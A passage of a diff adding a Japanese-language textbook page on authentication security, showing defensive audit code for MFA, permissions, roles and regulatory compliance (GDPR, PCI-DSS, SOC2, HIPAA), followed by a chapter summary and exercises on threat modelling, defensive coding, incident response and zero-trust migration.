+<p>                            'severity': 'LOW',</p>
+<p>                            'finding': 'バックアップコードの未使用率が高い',</p>
+<p>                            'implication': 'ユーザーがバックアップコードを保存していない可能性'</p>
+<p>                        })</p>
+                    
+<p>                    return AuditResult(</p>
+<p>                        area='Multi-Factor Authentication',</p>
+<p>                        findings=findings,</p>
+<p>                        compliance_score=self.calculate_compliance_score(findings)</p>
+<p>                    )</p>
+<p>            ''',</p>
+            
+<p>            'authorization_audit': '''</p>
+<p>            class AuthorizationAudit:</p>
+<p>                """認可システムの監査"""</p>
+                
+<p>                async def audit_permission_assignments(self) -> AuditResult:</p>
+<p>                    """権限割り当ての監査"""</p>
+                    
+<p>                    findings = []</p>
+                    
+<p>                    # 1. 過剰な権限の検出</p>
+<p>                    over_privileged_users = await self.find_over_privileged_users()</p>
+                    
+<p>                    for user in over_privileged_users:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'HIGH',</p>
+<p>                            'finding': '過剰な権限を持つユーザー',</p>
+<p>                            'user_id': user.id,</p>
+<p>                            'excessive_permissions': user.excessive_permissions,</p>
+<p>                            'recommendation': '最小権限の原則に基づく見直し'</p>
+<p>                        })</p>
+                    
+<p>                    # 2. 孤立した権限</p>
+<p>                    orphaned_permissions = await self.find_orphaned_permissions()</p>
+                    
+<p>                    if orphaned_permissions:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'MEDIUM',</p>
+<p>                            'finding': '孤立した権限が存在',</p>
+<p>                            'count': len(orphaned_permissions),</p>
+<p>                            'details': orphaned_permissions[:10]  # 最初の10件</p>
+<p>                        })</p>
+                    
+<p>                    # 3. 権限の不整合</p>
+<p>                    inconsistencies = await self.find_permission_inconsistencies()</p>
+                    
+<p>                    for inconsistency in inconsistencies:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'MEDIUM',</p>
+<p>                            'finding': '権限の不整合',</p>
+<p>                            'type': inconsistency.type,</p>
+<p>                            'affected_resources': inconsistency.resources</p>
+<p>                        })</p>
+                    
+<p>                    # 4. 長期間未使用の権限</p>
+<p>                    unused_permissions = await self.find_unused_permissions(days=90)</p>
+                    
+<p>                    if unused_permissions:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'LOW',</p>
+<p>                            'finding': '長期間未使用の権限',</p>
+<p>                            'count': len(unused_permissions),</p>
+<p>                            'recommendation': '定期的な権限レビュープロセスの実施'</p>
+<p>                        })</p>
+                    
+<p>                    return AuditResult(</p>
+<p>                        area='Permission Assignments',</p>
+<p>                        findings=findings,</p>
+<p>                        compliance_score=self.calculate_compliance_score(findings)</p>
+<p>                    )</p>
+                
+<p>                async def audit_role_definitions(self) -> AuditResult:</p>
+<p>                    """ロール定義の監査"""</p>
+                    
+<p>                    findings = []</p>
+                    
+<p>                    # ロールの複雑性分析</p>
+<p>                    role_complexity = await self.analyze_role_complexity()</p>
+                    
+<p>                    if role_complexity.average_permissions_per_role > 50:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'MEDIUM',</p>
+<p>                            'finding': 'ロールが過度に複雑',</p>
+<p>                            'average_permissions': role_complexity.average_permissions_per_role,</p>
+<p>                            'recommendation': 'ロールの細分化と整理'</p>
+<p>                        })</p>
+                    
+<p>                    # ロールの重複</p>
+<p>                    duplicate_roles = await self.find_duplicate_roles()</p>
+                    
+<p>                    for dup in duplicate_roles:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'LOW',</p>
+<p>                            'finding': '重複するロール定義',</p>
+<p>                            'roles': dup.role_names,</p>
+<p>                            'overlap_percentage': dup.overlap_percentage</p>
+<p>                        })</p>
+                    
+<p>                    # 危険な権限の組み合わせ</p>
+<p>                    dangerous_combinations = await self.find_dangerous_permission_combinations()</p>
+                    
+<p>                    for combo in dangerous_combinations:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'HIGH',</p>
+<p>                            'finding': '危険な権限の組み合わせ',</p>
+<p>                            'role': combo.role_name,</p>
+<p>                            'permissions': combo.dangerous_permissions,</p>
+<p>                            'risk': combo.risk_description</p>
+<p>                        })</p>
+                    
+<p>                    return AuditResult(</p>
+<p>                        area='Role Definitions',</p>
+<p>                        findings=findings,</p>
+<p>                        compliance_score=self.calculate_compliance_score(findings)</p>
+<p>                    )</p>
+<p>            ''',</p>
+            
+<p>            'compliance_audit': '''</p>
+<p>            class ComplianceAudit:</p>
+<p>                """コンプライアンス監査"""</p>
+                
+<p>                async def audit_regulatory_compliance(self) -> ComplianceReport:</p>
+<p>                    """規制要件への準拠状況監査"""</p>
+                    
+<p>                    report = ComplianceReport()</p>
+                    
+<p>                    # GDPR準拠</p>
+<p>                    if self.is_gdpr_applicable():</p>
+<p>                        gdpr_audit = await self.audit_gdpr_compliance()</p>
+<p>                        report.add_regulation('GDPR', gdpr_audit)</p>
+                    
+<p>                    # PCI-DSS準拠（カード情報を扱う場合）</p>
+<p>                    if self.handles_payment_cards():</p>
+<p>                        pci_audit = await self.audit_pci_dss_compliance()</p>
+<p>                        report.add_regulation('PCI-DSS', pci_audit)</p>
+                    
+<p>                    # SOC2準拠</p>
+<p>                    soc2_audit = await self.audit_soc2_compliance()</p>
+<p>                    report.add_regulation('SOC2', soc2_audit)</p>
+                    
+<p>                    # HIPAA準拠（医療情報を扱う場合）</p>
+<p>                    if self.handles_health_data():</p>
+<p>                        hipaa_audit = await self.audit_hipaa_compliance()</p>
+<p>                        report.add_regulation('HIPAA', hipaa_audit)</p>
+                    
+<p>                    return report</p>
+                
+<p>                async def audit_gdpr_compliance(self) -> RegulatoryAuditResult:</p>
+<p>                    """GDPR準拠監査"""</p>
+                    
+<p>                    findings = []</p>
+                    
+<p>                    # 同意管理</p>
+<p>                    consent_audit = await self.audit_consent_management()</p>
+<p>                    if not consent_audit.explicit_consent_implemented:</p>
+<p>                        findings.append({</p>
+<p>                            'requirement': 'GDPR Article 7 - Consent',</p>
+<p>                            'status': 'NON_COMPLIANT',</p>
+<p>                            'finding': '明示的な同意取得メカニズムが不足',</p>
+<p>                            'remediation': '同意管理システムの実装'</p>
+<p>                        })</p>
+                    
+<p>                    # データポータビリティ</p>
+<p>                    portability_audit = await self.audit_data_portability()</p>
+<p>                    if not portability_audit.export_functionality_exists:</p>
+<p>                        findings.append({</p>
+<p>                            'requirement': 'GDPR Article 20 - Data Portability',</p>
+<p>                            'status': 'NON_COMPLIANT',</p>
+<p>                            'finding': 'データエクスポート機能が未実装',</p>
+<p>                            'remediation': 'ユーザーデータエクスポートAPIの開発'</p>
+<p>                        })</p>
+                    
+<p>                    # 忘れられる権利</p>
+<p>                    erasure_audit = await self.audit_right_to_erasure()</p>
+<p>                    if erasure_audit.average_erasure_time > 30:</p>
+<p>                        findings.append({</p>
+<p>                            'requirement': 'GDPR Article 17 - Right to Erasure',</p>
+<p>                            'status': 'PARTIAL_COMPLIANT',</p>
+<p>                            'finding': 'データ削除に30日以上かかる',</p>
+<p>                            'current_average': erasure_audit.average_erasure_time,</p>
+<p>                            'remediation': '削除プロセスの自動化'</p>
+<p>                        })</p>
+                    
+<p>                    return RegulatoryAuditResult(</p>
+<p>                        regulation='GDPR',</p>
+<p>                        findings=findings,</p>
+<p>                        overall_compliance=self.calculate_gdpr_compliance_score(findings)</p>
+<p>                    )</p>
+<p>            '''</p>
+<p>        }</p>
+<p></code></pre></p><h2>まとめ</h2><p>この章では、認証認可システムのセキュリティと脅威対策について学びました：</p><p>1. <strong>主要な攻撃手法と対策</strong></p>
+<p>   - ブルートフォース、パスワードスプレー攻撃への対策</p>
+<p>   - セッション関連攻撃の防御</p>
+<p>   - 権限昇格攻撃の検知と防止</p><p>2. <strong>ペネトレーションテスト</strong></p>
+<p>   - 体系的なテスト計画の立案</p>
+<p>   - 認証・認可の脆弱性テスト</p>
+<p>   - 実践的なテストケース</p><p>3. <strong>インシデント対応</strong></p>
+<p>   - インシデントの分類と対応フロー</p>
+<p>   - 封じ込め、根絶、復旧のプロセス</p>
+<p>   - 事後分析と改善</p><p>4. <strong>定期的なセキュリティ監査</strong></p>
+<p>   - 包括的な監査チェックリスト</p>
+<p>   - コンプライアンス要件の確認</p>
+<p>   - 継続的な改善プロセス</p><p>次章では、パフォーマンスとスケーラビリティについて学びます。</p><h2>演習問題</h2><h3>問題1：脅威モデリング</h3>
+<p>以下のシステムに対する脅威モデルを作成しなさい：</p>
+<p>- 銀行のオンラインバンキングシステム</p>
+<p>- 100万ユーザー、24時間365日稼働</p>
+<p>- モバイルアプリとWebの両方に対応</p>
+<p>- 送金、残高照会、定期振込などの機能</p><h3>問題2：攻撃シミュレーション</h3>
+<p>以下の攻撃に対する防御コードを実装しなさい：</p>
+<p>- タイミング攻撃を考慮したユーザー認証</p>
+<p>- レインボーテーブル攻撃に強いパスワード保存</p>
+<p>- セッション固定攻撃の防御</p>
+<p>- CSRFトークンの実装</p><h3>問題3：インシデント対応計画</h3>
+<p>Eコマースサイトで以下のインシデントが発生した場合の対応計画を作成しなさい：</p>
+<p>- 管理者アカウントへの不正アクセスを検知</p>
+<p>- 過去48時間のアクセスログに異常</p>
+<p>- 一部の顧客データが閲覧された可能性</p>
+<p>- 現在もシステムは稼働中</p><h3>問題4：セキュリティ監査</h3>
+<p>中規模SaaS企業（従業員200名、顧客5000社）の認証認可システムの監査計画を作成しなさい。以下を含めること：</p>
+<p>- 監査スコープと目標</p>
+<p>- 監査手法とツール</p>
+<p>- タイムライン（3ヶ月間）</p>
+<p>- 成果物とレポート形式</p><h3>問題5：ゼロトラスト移行</h3>
+<p>従来の境界型セキュリティからゼロトラストアーキテクチャへの移行計画を作成しなさい：</p>
+<p>- 現状分析（AsIs）</p>
+<p>- 目標アーキテクチャ（ToBe）</p>
+<p>- 移行ステップ（6ヶ月計画）</p>
+<p>- リスクと対策</p>
+            </div>
+        </main>
+    </div>
+</body>
+</html>
